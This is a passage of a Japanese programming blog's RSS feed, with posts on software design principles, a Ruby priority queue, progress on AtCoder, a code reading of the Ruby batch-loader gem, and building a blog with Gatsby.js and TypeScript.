&lt;h3>SRP（単一責任）、CCP（閉鎖性共通の原則)&lt;/h3>
&lt;p>変更理由が違うものを別の&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%DD%A1%BC%A5%CD%A5%F3%A5%C8">コンポーネント&lt;/a>やモジュールにわける。入力クラスのConsoleReaderの変更理由とロジックの核であるEncryptの変更理由は明確にことなる。なので別モジュールになっているのである。&lt;/p>
&lt;h3>OCP(オープンアンドクローズドの原則）&lt;/h3>
&lt;p>依存が一方向で統一されているためConsoleReaderの変更はEncryptにはなんの影響もなく変更が容易&lt;/p>
&lt;h3>
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/DIP">DIP&lt;/a>(依存関係逆転）&lt;/h3>
&lt;p>変化しやすいConsoleReaderを参照したり継承はしない。変更されやすいものに依存してしまうと&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%BF%A1%BC%A5%D5%A5%A7%A5%A4%A5%B9">インターフェイス&lt;/a>を安定したものにできない。&lt;/p>
&lt;h3>SDP(安定依存の原則)&lt;/h3>
&lt;p>安定度が高いEncryptに依存していること。安定度が低いものに依存すると安定度が低いモジュールや&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%DD%A1%BC%A5%CD%A5%F3%A5%C8">コンポーネント&lt;/a>が変更しにくくなってしまう。&lt;/p>
&lt;h3>SAP(安定度・抽象度等価）&lt;/h3>
&lt;p>Encryptは抽象的であるべき、なぜなら複数のモジュールから依存されていて安定度が高いから。逆にConsoleReaderは具象であるべき。依存されていないので抽象的にするのが無駄だから。&lt;/p>
&lt;h2>まとめ&lt;/h2>
&lt;p>共通言語と理由を客観的に説明できるか？が設計における壁だと思うのでやっていきである。&lt;/p>
&lt;/body></description></item><item><title>RubyでPriority Queue</title><link>https://qwyng.dev/posts/2020/05/09/142222/</link><pubDate>Sat, 09 May 2020 14:22:00 +0900</pubDate><guid>https://qwyng.dev/posts/2020/05/09/142222/</guid><description>&lt;body>
&lt;p>精進でこの問題を解いてたらPriority Queueがでてきました。&lt;/p>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fatcoder.jp%2Fcontests%2Fabc141%2Ftasks%2Fabc141_d" title="D - Powerful Discount Tickets" class="embed-card embed-webcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://atcoder.jp/contests/abc141/tasks/abc141_d">atcoder.jp&lt;/a>&lt;/cite>&lt;/p>
&lt;p>"&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ruby">Ruby&lt;/a> Priority Queue"でググれば実装はたくさんでてくるのですが、実際自分で組んだ方が身につくと思い実装してみました。&lt;/p>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fgithub.com%2FQWYNG%2Fatcoder_work_space%2Fblob%2Fmaster%2Fsnipet%2Fpriority_queue.rb" title="QWYNG/atcoder_work_space" class="embed-card embed-webcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://github.com/QWYNG/atcoder_work_space/blob/master/snipet/priority_queue.rb">github.com&lt;/a>&lt;/cite>&lt;/p>
&lt;p>MaxHeapかMinHeapかを外部から注入するのについsendを使いがち。
だいたいこんなふうに動きます。&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> RSpec.describe 'PriorityQueue' do
context 'direction is max' do
it 'enqueue element' do
pq = PriorityQueue.new(:max, [])
pq.enqueue(3)
pq.enqueue(9)
pq.enqueue(6)
pq.enqueue(1)
expect(pq.heap.nodes).to eq([9, 3, 6, 1])
end
it 'dequeue element' do
pq = PriorityQueue.new(:max, [9, 3, 6, 1])
expect(pq.dequeue).to eq(9)
expect(pq.heap.nodes).to eq([6, 3, 1])
end
end
context 'direction is min' do
it 'enqueue element' do
pq = PriorityQueue.new(:min, [])
pq.enqueue(3)
pq.enqueue(9)
pq.enqueue(6)
pq.enqueue(1)
expect(pq.heap.nodes).to eq([1, 3, 6, 9])
end
it 'dequeue element' do
pq = PriorityQueue.new(:min, [1, 3, 6, 9])
expect(pq.dequeue).to eq(1)
expect(pq.heap.nodes).to eq([3, 9, 6])
end
end
end
&lt;/pre>
&lt;p>Priority Queueというかヒープの特徴は&lt;/p>
&lt;ul>
&lt;li>最小値、最大値を探す時に全探査だとO(n)のところがO(1)で取れる&lt;/li>
&lt;li>追加、再構築はヒープの高さ（この場合二分ヒープ）がlog 2 nなので計算時間はO(log n)&lt;/li>
&lt;li>全探査でいちいち最大値、最小値を探すよりもO(n) - O( 1 + 2 (log n))分早い？&lt;/li>
&lt;li>何度も数字をいじってそのたびに最小値、最大値を求めるときに便利。&lt;/li>
&lt;/ul>
&lt;p>書いててわかってるか不安になってきた。&lt;/p>
&lt;/body></description></item><item><title>Atcoderで茶色になりました</title><link>https://qwyng.dev/posts/2020/05/04/000744/</link><pubDate>Mon, 04 May 2020 00:07:00 +0900</pubDate><guid>https://qwyng.dev/posts/2020/05/04/000744/</guid><description>&lt;body>
&lt;p>&lt;/p>
&lt;blockquote class="twitter-tweet" data-lang="en">
&lt;p lang="ja" dir="ltr">ratedやった～～～&lt;br>33回目にしてついに茶色！ &lt;a href="https://t.co/MgVolhexeU">pic.twitter.com/MgVolhexeU&lt;/a>&lt;/p>— とるめん (@qwyngg) &lt;a href="https://twitter.com/qwyngg/status/1256626134420058113?ref_src=twsrc%5Etfw">May 2, 2020&lt;/a>
&lt;/blockquote> &lt;script async src="https://platform.twitter.com/widgets.js" charset="utf-8">&lt;/script>
というわけでなんとかやりました。
数学の素養が全く無い人間でも数こなせばなんとかなるものですね。
&lt;h2>茶色に必要なこと&lt;/h2>
&lt;p>有名な記事で茶色についての記述にこのようなものがあります。&lt;/p>
&lt;p>&lt;a href="https://qiita.com/e869120/items/f1c6f98364d1443148b3">レッドコーダーが教える、競プロ・AtCoder上達のガイドライン【初級編：競プロを始めよう】 - Qiita&lt;/a>&lt;/p>
&lt;blockquote>
&lt;ul>
&lt;li>
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/AtCoder">AtCoder&lt;/a> Beginner Contest の A, B 問題が確実に（大方 15 分以内で）解ける&lt;/li>
&lt;li>
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/AtCoder">AtCoder&lt;/a> Beginner Contest の C 問題も簡単なものなら解ける&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;p>ですが、参加者がかなり増えてる現在、茶色になるには&lt;/p>
&lt;ul>
&lt;li>
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/AtCoder">AtCoder&lt;/a> Beginner Contest の A, B, C問題が確実に（大方 30 分以内で）解ける&lt;/li>
&lt;/ul>
&lt;p>ぐらいに茶色の難易度が上がっていると思います。この上でDが安定し解けると緑が見えてくると思います。&lt;/p>
&lt;h2>茶色になる上で役に立ったこと&lt;/h2>
&lt;p>僕は典型的な私立文系でこの前まで分数の割り算すら怪しいレベルでした。おそらく数学の素養みたいなものがなに一つなく、組み合わせや確率等&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0">アルゴリズム&lt;/a>以前の基礎の概念&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A4%AB%A4%E9%A4%B7">からし&lt;/a>てあやふやでした。
そんな僕に一&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%C8%D6%CC%F2">番役&lt;/a>に立った本は&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%B7%EB%BE%EB%B9%C0">結城浩&lt;/a>先生の「&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%D7%A5%ED%A5%B0%A5%E9%A5%DE">プログラマ&lt;/a>の数学」です。&lt;/p>
&lt;p>&lt;/p>
&lt;div class="hatena-asin-detail">
&lt;a href="https://www.amazon.co.jp/exec/obidos/ASIN/4797395451/hatena-blog-22/">&lt;img src="https://m.media-amazon.com/images/I/51JY0QLFuEL._SL160_.jpg" class="hatena-asin-detail-image" alt="プログラマの数学第2版" title="プログラマの数学第2版">&lt;/a>&lt;div class="hatena-asin-detail-info">
&lt;p class="hatena-asin-detail-title">&lt;a href="https://www.amazon.co.jp/exec/obidos/ASIN/4797395451/hatena-blog-22/">プログラマの数学第2版&lt;/a>&lt;/p>
&lt;ul>
&lt;li>
&lt;span class="hatena-asin-detail-label">作者:&lt;/span>&lt;a href="http://d.hatena.ne.jp/keyword/%B7%EB%BE%EB%20%B9%C0" class="keyword">結城 浩&lt;/a>
&lt;/li>
&lt;li>
&lt;span class="hatena-asin-detail-label">発売日:&lt;/span> 2018/01/17&lt;/li>
&lt;li>
&lt;span class="hatena-asin-detail-label">メディア:&lt;/span> 単行本&lt;/li>
&lt;/ul>
&lt;/div>
&lt;div class="hatena-asin-detail-foot">&lt;/div>
&lt;/div>
&lt;p>この本は本当に良書です。数学の基礎がない自分でも読み進められるくらい解説が易しいですし、組み合わせ、順列、確率、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%BA%C6%B5%A2">再帰&lt;/a>等競プロの常識ともいえる概念がコンパクトにまとまっていました。
この本を読んだ後はABCの茶色diffの問題を毎日少しづつ解いていきました。&lt;/p>
&lt;p>&lt;figure class="figure-image figure-image-fotolife" title="精進継続中！">&lt;span itemscope itemtype="http://schema.org/Photograph">&lt;img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/sasa5740/20200503/20200503234751.png" alt="f:id:sasa5740:20200503234751p:plain" title="f:id:sasa5740:20200503234751p:plain" class="hatena-fotolife" itemprop="image">&lt;/span>&lt;figcaption>精進継続中！&lt;/figcaption>&lt;/figure>&lt;/p>
&lt;p>やっぱり精進をはじめてからグンと（当社比）レートが伸びたのでやっぱり精進が一番の近道ですね。&lt;/p>
&lt;h2>茶色になって思うこと&lt;/h2>
&lt;p>正直茶色になるのに&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0">アルゴリズム&lt;/a>の知識はいらないと思います。Cまでは基本的に全探査で解けます。Dではじめて蟻本や螺旋本にでてくる&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0">アルゴリズム&lt;/a>を使うと思います。&lt;br>
僕みたいに数学の素養が全くない人間が最初に蟻本や螺旋本に手をだすと勉強したことが自分の毎週解くべき課題にあんまり役に立たないという事態になりやすいです。&lt;br>
逆にいうとこれでやっと&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0">アルゴリズム&lt;/a>というものを学ぶ準備ができたのだと思います。緑diffの問題で精進やっていくぞ。&lt;/p>
&lt;h2>追記&lt;/h2>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ruby">Ruby&lt;/a>で&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Atcoder">Atcoder&lt;/a>のテスト自動生成するライブラリを自作しているので、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ruby">Ruby&lt;/a>使ってる方ぜひ試してみてください。
僕はこれでうっかりWAはだいぶ減りました。&lt;/p>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fqiita.com%2FQWYNG%2Fitems%2F0e2e6b72bd1969d0d751" title="RubyでAtcoderからテストを自動生成するライブラリを作りました - Qiita" class="embed-card embed-webcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://qiita.com/QWYNG/items/0e2e6b72bd1969d0d751">qiita.com&lt;/a>&lt;/cite>&lt;/p>
&lt;/body></description></item><item><title>OSSコードリーディング Batch-loader</title><link>https://qwyng.dev/posts/2020/04/29/161905/</link><pubDate>Wed, 29 Apr 2020 16:19:00 +0900</pubDate><guid>https://qwyng.dev/posts/2020/04/29/161905/</guid><description>&lt;body>
&lt;p>Batch-loaderという&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ruby">Ruby&lt;/a>でバッチローディングをするGemを読んで、そのきれいな実装に感心したのでまとめた。&lt;/p>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fgithub.com%2FexAspArk%2Fbatch-loader" title="exAspArk/batch-loader" class="embed-card embed-webcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://github.com/exAspArk/batch-loader">github.com&lt;/a>&lt;/cite>&lt;/p>
&lt;p>実装自体はシンプルだけど、特定のGemに依存しているわけではないので使い方に融通が効くし、困った時に&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%C8%A5%E9%A5%D6%A5%EB%A5%B7%A5%E5%A1%BC%A5%C6%A5%A3%A5%F3%A5%B0">トラブルシューティング&lt;/a>しやすい。&lt;br>
この記事は社内で一度発表したものだけど、上司に確認したらブログに載せても問題ないとのことだったので載せる。&lt;/p>
&lt;p>&lt;a href="https://github.com/exAspArk/batch-loader/blob/master/README.md">README&lt;/a>、&lt;a href="https://speakerdeck.com/exaspark/batching-a-powerful-way-to-solve-n-plus-1-queries">Gem作成者のスライド&lt;/a>の２つを読むのが一番という説がある。&lt;/p>
&lt;h1>Batch-loaderがやりたいこと&lt;/h1>
&lt;p>そもそもこのGem何がしたいの？という人はこの記事を読むといい。&lt;br>
&lt;a href="https://techracho.bpsinc.jp/hachi8833/2017_09_07/45077">Rails: N+1クエリを「バッチング」で解決するBatchLoader gem（翻訳）&lt;/a>&lt;br>
DBやHTTPリク&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A8%A5%B9">エス&lt;/a>トのN + 1問題をbatch load(一塊りでロードする）で解消するというもの。リク&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A8%A5%B9">エス&lt;/a>トされた引数をまとめておき、値と&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%DE%A5%C3%A5%D4%A5%F3%A5%B0">マッピング&lt;/a>だけコレクションしておき、実際の値の取得は最後に解決しようとする。&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> def load_user(post)
BatchLoader.for(post.user_id).batch do |user_ids, loader|
User.where(id: user_ids).each { |user| loader.call(user.id, user) }
end
end
posts = Post.where(id: [1, 2, 3]) # SELECT * FROM posts WHERE id IN (1, 2, 3)
users = posts.map do |post|
load_user(post)
end
puts users # SELECT * FROM users WHERE id IN (1, 2, 3)
&lt;/pre>
&lt;p>&lt;code>load_user&lt;/code>の中身がBatch-loaderの基本的な使い方。&lt;/p>
&lt;p>この記事では大きく分けて&lt;/p>
&lt;ul>
&lt;li>実際に複数回呼び出されるpost.user_idをどうやってbatch(一群)にしているのか&lt;/li>
&lt;li>batchしたもの(今回の例だとuser_id)をどうやって本当のオブジェクトにしているのか&lt;/li>
&lt;/ul>
&lt;p>の２つに分けて書いていく。&lt;/p>
&lt;h2>図でまとめたやつ&lt;/h2>
&lt;p>最初に図でザックリまとめたやつをのっけておく。&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> def load_user(post)
BatchLoader.for(post.user_id).batch do |user_ids, loader|
User.where(id: user_ids).each { |user| loader.call(user.id, user) }
end
end
&lt;/pre>
&lt;p>&lt;span itemscope itemtype="http://schema.org/Photograph">&lt;img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/sasa5740/20200429/20200429145512.png" alt="f:id:sasa5740:20200429145512p:plain" title="f:id:sasa5740:20200429145512p:plain" class="hatena-fotolife" itemprop="image">&lt;/span>&lt;/p>
&lt;p>&lt;span itemscope itemtype="http://schema.org/Photograph">&lt;img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/sasa5740/20200429/20200429160902.png" alt="f:id:sasa5740:20200429160902p:plain" title="f:id:sasa5740:20200429160902p:plain" class="hatena-fotolife" itemprop="image">&lt;/span>&lt;/p>
&lt;h1>実際に複数回呼び出されるpost.user_idをどうやってbatch(一群)にしているのか&lt;/h1>
&lt;p>最初に例に上げた&lt;code>load_user&lt;/code>メソッド内では&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> BatchLoader.for(post.user_id).batch(&amp;amp;block)
&lt;/pre>
&lt;p>という形の処理を書いていた。
forはnewの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A8%A5%A4%A5%EA%A5%A2%A5%B9">エイリアス&lt;/a>。BatchLoaderの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9">インスタンス&lt;/a>は引数を&lt;code>@item&lt;/code>として持つ。
batchの中身は以下。&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> def batch(default_value: nil, cache: true, replace_methods: nil, key: nil, &amp;amp;batch_block)
@default_value = default_value
@cache = cache
@replace_methods = replace_methods.nil? ? cache : replace_methods
@key = key
@batch_block = batch_block
__executor_proxy.add(item: @item)
__singleton_class.class_eval { undef_method(:batch) }
self
end
&lt;/pre>
&lt;p>&lt;code>@key = key&lt;/code>以上の行はオプション処理。渡したブロックは&lt;code>@batch_block&lt;/code>変数に入る。&lt;/p>
&lt;p>ここでは大きく分けて２つ処理がある&lt;/p>
&lt;ul>
&lt;li>&lt;code>__executor_proxy.add(item: @item)&lt;/code>&lt;/li>
&lt;li>&lt;code>__singleton_class.class_eval { undef_method(:batch) }&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3>&lt;code>__executor_proxy.add(item: @item)&lt;/code>&lt;/h3>
&lt;p>&lt;code>__executor_proxy&lt;/code>の中身は&lt;code>BatchLoader::Executor&lt;/code>というクラスのプロキシオブジェクト。&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> def __executor_proxy
@__executor_proxy ||= begin
raise NoBatchError.new("Please provide a batch block first") unless @batch_block
BatchLoader::ExecutorProxy.new(@default_value, @key, &amp;amp;@batch_block)
end
end
&lt;/pre>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> class BatchLoader
class ExecutorProxy
def initialize(default_value, key, &amp;amp;block)
@default_value = default_value
@block = block
@block_hash_key = [block.source_location, key]
@global_executor = BatchLoader::Executor.ensure_current
end
&lt;/pre>
&lt;p> 実際の&lt;code>BatchLoader::Executor&lt;/code>の中身。&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> class BatchLoader
class Executor
NAMESPACE = :batch_loader
def self.ensure_current
Thread.current[NAMESPACE] ||= new
end
attr_reader :items_by_block, :loaded_values_by_block
def initialize
@items_by_block = Hash.new { |hash, key| hash[key] = Set.new }
@loaded_values_by_block = Hash.new { |hash, key| hash[key] = {} }
end
end
end
&lt;/pre>
&lt;p>要はスレッドごとに&lt;code>@items_by_block&lt;/code>と&lt;code>@loaded_values_by_block&lt;/code>という２つハッシュを持つのがExecutor。
ExecutorProxyの役割は&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9">インスタンス&lt;/a>ごとに&lt;code>@block&lt;/code>を保持し自身を通してブロックごとにBatchLoaderからアクセスするExecutorのハッシュを特定すること。&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> # in ExecutorProxy
def items_to_load
global_executor.items_by_block[@block_hash_key]
end
def loaded
global_executor.loaded_values_by_block[@block_hash_key]
end
&lt;/pre>
&lt;p>最終的にBatchLoaderの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9">インスタンス&lt;/a>が複数作られ、それらは全て同じExecutorの&lt;code>@items_by_block&lt;/code>に対して&lt;code>BatchLoader#batch&lt;/code>に渡されたブロックそのものをkeyとして&lt;code>post.user_id&lt;/code>をためていく。
&lt;code>@loaded_values_by_block&lt;/code>は実際の値と&lt;code>user.id&lt;/code>を紐づけたものが入っていくことになる。&lt;/p>
&lt;p>&lt;code>__executor_proxy.add(item: @item)&lt;/code>についてまとめると&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> __executor_proxy.add(item: post.user_id)
# ↓
BatchLoader::ExecutorProxy.new(&amp;amp;@batch_block).items_by_block["#{`batch_blockのソースライン情報`}"] &amp;lt;&amp;lt; post.user_id
# items_by_block[@block_hash_key]はデフォルトで空のSetのインスタンスが入っている。
&lt;/pre>
&lt;p>&lt;code>BatchLoader.for(post.user_id).batch(&amp;amp;block)&lt;/code>は何度実行しても&lt;code>&amp;amp;block&lt;/code>のソースロケーションが同じであれば同一の
&lt;code>items_by_block[batch_blockのソースライン情報]&lt;/code>というSetにpost.user_id`をつめこんでいくことになる。&lt;/p>
&lt;h3>&lt;code>__singleton_class.class_eval { undef_method(:batch) }&lt;/code>&lt;/h3>
&lt;p>最後の&lt;code>__singleton_class.class_eval { undef_method(:batch) }&lt;/code>について。
BatchLoaderの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9">インスタンス&lt;/a>の特異クラスからbatchメソッドを消している。
これは同じ&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9">インスタンス&lt;/a>に対して&lt;code>batch&lt;/code>の次の二回目メソッドの呼び出しは&lt;code>batch&lt;/code>自身も含めて全て&lt;code>method_missing&lt;/code>に飛ばしたいという意図があると思われる。&lt;/p>
&lt;p>そしてこれがBatchLoaderクラスの&lt;code>method_missing&lt;/code>。&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> def method_missing(method_name, *args, &amp;amp;block)
__sync!.public_send(method_name, *args, &amp;amp;block)
end
&lt;/pre>
&lt;p>実際にmethod_missingが走る時（本当にUserの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9">インスタンス&lt;/a>そのものが必要になった時)
については次章で解説する。&lt;/p>
&lt;p>ここまでで&lt;code>executor.items_by_block[#{BatchLoader#batchに渡したブロック}"]&lt;/code>に&lt;code>post.user_id&lt;/code>が複数積み込まれたことになる。&lt;/p>
&lt;h1>batchしたものをどうやって本当のオブジェクトにしているのか&lt;/h1>
&lt;p>ここから実際にオブジェクトをロードする過程に入る。&lt;/p>
&lt;p>実際にlazyなオブジェクトが使用される時、ということはなにかしらメソッドが呼び出される時であり、その時にBatchLoaderの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9">インスタンス&lt;/a>では
method_missingが呼び出される。&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> def method_missing(method_name, *args, &amp;amp;block)
__sync!.public_send(method_name, *args, &amp;amp;block)
end
&lt;/pre>
&lt;p>&lt;code>__sync!&lt;/code>は概ね&lt;code>__sync&lt;/code>のラッパー。
BatchLoaderクラス内では多くのメソッドが&lt;code>__&lt;/code>というprefixが付いているが、実際のオブジェクトのメソッドと極力かぶらないためだろう。&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> def __sync!
loaded_value = __sync
if @replace_methods
__replace_with!(loaded_value)
else
loaded_value
end
end
&lt;/pre>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> def __sync
return @loaded_value if @synced
__ensure_batched
@loaded_value = __executor_proxy.loaded_value(item: @item)
if @cache
@synced = true
else
__purge_cache
end
@loaded_value
end
&lt;/pre>
&lt;p>&lt;code>__ensure_batched&lt;/code>をみると&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> def __ensure_batched
return if __executor_proxy.value_loaded?(item: @item)
items = __executor_proxy.list_items
loader = __loader
args = {default_value: @default_value, cache: @cache, replace_methods: @replace_methods, key: @key}
@batch_block.call(items, loader, args)
items.each do |item|
next if __executor_proxy.value_loaded?(item: item)
loader.call(item, @default_value)
en
__executor_proxy.delete(items: items)
end
&lt;/pre>
&lt;p>最初にloaderを作っている。&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> def __loader
mutex = Mutex.new
-&amp;gt; (item, value = (no_value = true; nil), &amp;amp;block) do
if no_value &amp;amp;&amp;amp; !block
raise ArgumentError, "Please pass a value or a block"
elsif block &amp;amp;&amp;amp; !no_value
raise ArgumentError, "Please pass a value or a block, not both"
end
mutex.synchronize do
next_value = block ? block.call(__executor_proxy.loaded_value(item: item)) : value]
__executor_proxy.load(item: item, value: next_value)
end
end
end
&lt;/pre>
&lt;p>lamdaオブジェクト。「(item, &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/value">value&lt;/a> xor block)を引数にとって実際に&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/value">value&lt;/a>をloadするlamda」がloaderである。&lt;/p>
&lt;p>&lt;code>__ensure_batched&lt;/code>では次に&lt;code>@batch_block.call(items, loader, args)&lt;/code>が実行される。
最初の&lt;code>load_user&lt;/code>で書いた&lt;code>batch&lt;/code>に渡しているブロックが@batch_block。loaderには先程のlamdaオブジェクトが渡される。&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> def load_user(post)
BatchLoader.for(post.user_id).batch do |user_ids, loader|
User.where(id: user_ids).each { |user| loader.call(user.id, user) }
end
end
&lt;/pre>
&lt;p>loaderというlamdaに渡しているのは&lt;code>user.id&lt;/code>と実際の&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/value">value&lt;/a>である&lt;code>user&lt;/code>。
この２つの引数がExecutorProxyを通してExecutorの&lt;code>@loaded_values_by_block[batch_blockのソースライン情報]&lt;/code>というハッシュに
&lt;code>{ user.id: user }&lt;/code>　という形で追加されていくことになる。&lt;br>
ここで&lt;code>__sync&lt;/code>に戻ると&lt;br>
&lt;code>@loaded_value = __executor_proxy.loaded_value(item: @item)&lt;/code>&lt;br>
これはBatchLoaderの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9">インスタンス&lt;/a>がもつそれぞれの&lt;code>@item&lt;/code>( = post.user_id)
を使ってExecuterの&lt;code>@loaded_values_by_block[batch_blockのソースライン情報][@item]&lt;/code>としてハッシュから値をとりだしている処理。&lt;br>
&lt;code>post.user_id&lt;/code>と先程loadした&lt;code>{ user.id: user }&lt;/code>の&lt;code>user.id&lt;/code>は等しいはずなのでここで無事にBatchLoaderの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9">インスタンス&lt;/a>ごとに正しいuserを引っ張ってくることができる。&lt;br>
以降は別のBatchLoader&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9">インスタンス&lt;/a>では&lt;code>@loaded_values_by_block[batch_blockのソースライン情報]&lt;/code>というハッシュが中身付きでメモリに存在するため、再度&lt;code>User.where(id: user_ids).each { |user| loader.call(user.id, user) }&lt;/code>という行為をする必要がなくなる。これにてBatch-Loading完了となる。&lt;/p>
&lt;/body></description></item><item><title>Gatsby.jsとTypeScriptでミニブログを作った</title><link>https://qwyng.dev/posts/2020/04/27/223737/</link><pubDate>Mon, 27 Apr 2020 22:37:00 +0900</pubDate><guid>https://qwyng.dev/posts/2020/04/27/223737/</guid><description>&lt;body>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Scala">Scala&lt;/a>をそこそこやって型いいじゃん！とすこしづつ思いはじめてきたのでTypeScriptとReactで遊ぶがてら&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Gatsby">Gatsby&lt;/a>.jsでブログを書いてみた。&lt;/p>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Ftallmanlog.netlify.app%2F" title="とるめんろぐ" class="embed-card embed-webcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://tallmanlog.netlify.app/">tallmanlog.netlify.app&lt;/a>&lt;/cite>&lt;/p>
&lt;p>なんのOGPもなくて寂しい。
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%BD%A1%BC%A5%B9%A5%B3%A1%BC%A5%C9">ソースコード&lt;/a>はこれ
&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fgithub.com%2FQWYNG%2Ftallman" title="QWYNG/tallman" class="embed-card embed-webcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://github.com/QWYNG/tallman">github.com&lt;/a>&lt;/cite>&lt;/p>
&lt;h2>TypeScript&lt;/h2>
&lt;p>とりあえず&lt;a href="https://typescript-jp.gitbook.io/deep-dive/">TypeScript deep dive&lt;/a>でundefind使えと書いてあったのでundefind使ったりよちよち歩きでやっている。とはいえよちよちでも&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/IDE">IDE&lt;/a>はしっかりと補完してくれるしESLintはしっかり指摘してくれるので型の恩恵にはあずかれてる気がする。&lt;/p>
&lt;h2>React&lt;/h2>
